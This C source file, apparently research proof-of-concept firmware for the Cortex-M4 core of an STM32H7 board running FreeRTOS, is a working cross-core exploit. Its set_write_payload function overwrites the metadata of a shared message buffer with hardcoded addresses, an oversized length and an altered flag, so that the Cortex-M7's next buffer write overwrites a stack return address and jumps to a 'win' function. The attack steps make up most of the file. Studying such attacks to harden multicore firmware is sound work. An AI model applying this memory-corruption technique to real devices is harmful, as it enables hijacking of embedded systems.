/* USER CODE BEGIN Header */
/**
 ******************************************************************************
 * @file           : main.c
 * @brief          : Main program body
 ******************************************************************************
 * @attention
 *
 * Copyright (c) 2024 STMicroelectronics.
 * All rights reserved.
 *
 * This software is licensed under terms that can be found in the LICENSE file
 * in the root directory of this software component.
 * If no LICENSE file comes with this software, it is provided AS-IS.
 *
 ******************************************************************************
 */
/* USER CODE END Header */
/* Includes ------------------------------------------------------------------*/
#include "main.h"
#include "stdio.h"
#include "string.h"
/* FreeRTOS includes. */
#include "FreeRTOS.h"
#include "task.h"
#include "message_buffer.h"
#include "MessageBufferAMP.h"
#include "stm32h7xx_nucleo.h"

#ifndef HSEM_ID_0
#define HSEM_ID_0 (0U) /* HW semaphore 0*/
#endif


#define SYNC // this is the line to comment for experiment 4 or 5

#define HAL_TIMEOUT_VALUE 0xFFFFFFFF
#define countof(a) (sizeof(a) / sizeof(*(a)))

volatile int current_state = 0;

UART_HandleTypeDef huart2;


void inc_state(){
	current_state++;
}

// do a blocking semaphore acquire
void maybe_lock(){
#ifdef SYNC
	while (HAL_HSEM_Take(HSEM_ID_0, HSEM_PROCESSID_MIN) != HAL_OK){};
#endif
}

// unlock the semaphore
void unlock(){
#ifdef SYNC
	HAL_HSEM_Release(HSEM_ID_0, HSEM_PROCESSID_MIN);
#endif
}


// manipulate the xMessageBuffer in a way that allows for arbitrary writing
// to be called before sending
void set_write_payload(){
	// the type definitions are hidden in the code, so we do it ourselves
	typedef struct {
		// xTail is where the next read starts
		size_t xTail;
		// xHead is where the next input is written
		size_t xHead;
		size_t xLength;
		size_t xTriggerLevelBytes;
		void* xTaskWaitingToReceive;
		void* xTaskWaitingToSend;
		// the buffer containing our data
		uint8_t* buffer;
		uint8_t ucFlags;
		uint32_t uxStreamBufferNumber;
	} MessageBuffer;
	// we know where the struct is in memory
	MessageBuffer* mb = (MessageBuffer*) 0x38000004;

	// set length sufficiently large that we pass boundary checks
	mb->xLength = 0xffffffff;

	// we want to write <target_addr>
	// target address here is the return address of the memcpy in prvWriteBytesToBuffer
	// as this memcpy does the overwrite
	uint32_t target_addr = 0x2407ff34;
	uint32_t source_addr = 0x38000040;

	// our starting address is 0x38000040, so we need to find
	// addr such that <source_addr> + <addr> = <target_addr>

	// this computation will overflow, but no problem, size_t is signed
	// but even if unsigned, we can set buffer base and index, so we modify
	// the buffer base instead in that scenario
	mb->xHead = target_addr - source_addr;

	// set the flags to 2. If ucFlags & 1 == 1, this is considered a message buffer
	// and the first 4 bytes are interpreted as length. In our case, we want to read
	// the data directly and repurpose the struct then to a streambuffer, which does
	// not start with a length
	mb->ucFlags = 2;
}


/**
 * @brief  The application entry point.
 * @retval int
 */
int main(void)
{
	uint32_t *sync_counter = 0x38000100;
	/*HW semaphore Clock enable*/
	__HAL_RCC_HSEM_CLK_ENABLE();
	/* Activate HSEM notification for Cortex-M4*/
	HAL_HSEM_ActivateNotification(__HAL_HSEM_SEMID_TO_MASK(HSEM_ID_0));
	/*
  Domain D2 goes to STOP mode (Cortex-M4 in deep-sleep) waiting for Cortex-M7 to
  perform system initialization (system clock config, external memory configuration.. )
	 */
	HAL_PWREx_ClearPendingEvent();
	HAL_PWREx_EnterSTOPMode(PWR_MAINREGULATOR_ON, PWR_STOPENTRY_WFE, PWR_D2_DOMAIN);
	/* Clear HSEM flag */
	__HAL_HSEM_CLEAR_FLAG(__HAL_HSEM_SEMID_TO_MASK(HSEM_ID_0));

	HAL_Init();

	MX_USART2_UART_Init();

	// step 1: setup the ram with our shellcode
	uint8_t welcome[] = "\r\nStarting experiment!\r\n";
	HAL_UART_Transmit(&huart2, (uint8_t*)&welcome, countof(welcome)-1, HAL_TIMEOUT_VALUE);

	while(*sync_counter < 1){};
	if( xCoreMessageBuffer == NULL )
	{
		Error_Handler();
	}
	xMessageBufferReset(xCoreMessageBuffer);
	// 0x08000755 is the address of the win function in the m7
	char cString[6] = { 0x55, 0x07, 0x00, 0x08, 0x00, 0x00};

	// step 2: send the address of our shellcode via the message buffer
	uint8_t step_2[] = "\r\nStep 1: Send new return address\r\n";
	HAL_UART_Transmit(&huart2, (uint8_t*)&step_2, countof(step_2)-1, HAL_TIMEOUT_VALUE);
	// to replicate experiment 1, add semaphore access around m4 reception and sending
	maybe_lock();
	xMessageBufferSend( xCoreMessageBuffer, ( void * ) cString, 4, 0 );
	unlock();
	uint8_t step_2_done[] = "\r\nStep 1: Send new return address done!\r\n";
	HAL_UART_Transmit(&huart2, (uint8_t*)&step_2_done, countof(step_2_done)-1, HAL_TIMEOUT_VALUE);
	(*sync_counter)++;
	// wait until the m7 read the value
	while(*sync_counter < 3){};

	// step 3: modify the message queue metadata such that on writeback, it writes instead to some other place
	uint8_t step_3[] = "\r\nStep 2: Modifying shared message struct!\r\n";
	HAL_UART_Transmit(&huart2, (uint8_t*)&step_3, countof(step_3)-1, HAL_TIMEOUT_VALUE);
	maybe_lock();
	set_write_payload();
	unlock();
	uint8_t step_3_done[] = "\r\nStep 2: Modifying shared message struct done!\r\n";
	HAL_UART_Transmit(&huart2, (uint8_t*)&step_3_done, countof(step_3_done)-1, HAL_TIMEOUT_VALUE);
	(*sync_counter)++;
	// at this point, our attack is over and m7 should execute our shellcode
	// the win func prints "The attack worked!" on uart over on the m7
	// in regular program logic, the win func is never invoked

	while(1){};
}

/**
 * @brief USART2 Initialization Function
 * @param None
 * @retval None
 */
void MX_USART2_UART_Init(void)
{
	huart2.Instance = USART2;
	huart2.Init.BaudRate = 9600;
	huart2.Init.WordLength = UART_WORDLENGTH_8B;
	huart2.Init.StopBits = UART_STOPBITS_1;
	huart2.Init.Parity = UART_PARITY_NONE;
	huart2.Init.Mode = UART_MODE_TX_RX;
	huart2.Init.HwFlowCtl = UART_HWCONTROL_NONE;
	huart2.Init.OverSampling = UART_OVERSAMPLING_16;
	huart2.Init.OneBitSampling = UART_ONE_BIT_SAMPLE_DISABLE;
	huart2.Init.ClockPrescaler = UART_PRESCALER_DIV1;
	huart2.AdvancedInit.AdvFeatureInit = UART_ADVFEATURE_NO_INIT;
	if (HAL_UART_Init(&huart2) != HAL_OK)
	{
		Error_Handler();
	}
	if (HAL_UARTEx_SetTxFifoThreshold(&huart2, UART_TXFIFO_THRESHOLD_1_8) != HAL_OK)
	{
		Error_Handler();
	}
	if (HAL_UARTEx_SetRxFifoThreshold(&huart2, UART_RXFIFO_THRESHOLD_1_8) != HAL_OK)
	{
		Error_Handler();
	}
	if (HAL_UARTEx_DisableFifoMode(&huart2) != HAL_OK)
	{
		Error_Handler();
	}

}

/* USER CODE BEGIN 4 */
void HAL_GPIO_EXTI_Callback(uint16_t GPIO_Pin)
{
	if (GPIO_Pin == GPIO_PIN_13)
	{
		inc_state();
		/* Toggle LED2 */
		BSP_LED_Toggle(LED2);
	}
}
/**
 * @brief  Period elapsed callback in non blocking mode
 * @note   This function is called  when TIM2 interrupt took place, inside
 * HAL_TIM_IRQHandler(). It makes a direct call to HAL_IncTick() to increment
 * a global variable "uwTick" used as application time base.
 * @param  htim : TIM handle
 * @retval None
 */
void HAL_TIM_PeriodElapsedCallback(TIM_HandleTypeDef *htim)
{
	/* USER CODE BEGIN Callback 0 */

	/* USER CODE END Callback 0 */
	if (htim->Instance == TIM2) {
		HAL_IncTick();
	}
	/* USER CODE BEGIN Callback 1 */

	/* USER CODE END Callback 1 */
}

/**
 * @brief  This function is executed in case of error occurrence.
 * @retval None
 */
void Error_Handler(void)
{
	/* USER CODE BEGIN Error_Handler_Debug */
	/* User can add his own implementation to report the HAL error return state */
	__disable_irq();
	while (1)
	{
	}
	/* USER CODE END Error_Handler_Debug */
}

#ifdef  USE_FULL_ASSERT
/**
 * @brief  Reports the name of the source file and the source line number
 *         where the assert_param error has occurred.
 * @param  file: pointer to the source file name
 * @param  line: assert_param error line source number
 * @retval None
 */
void assert_failed(uint8_t *file, uint32_t line)
{
	/* USER CODE BEGIN 6 */
	/* User can add his own implementation to report the file name and line number,
     ex: printf("Wrong parameters value: file %s on line %d\r\n", file, line) */
	/* USER CODE END 6 */
}
#endif /* USE_FULL_ASSERT */
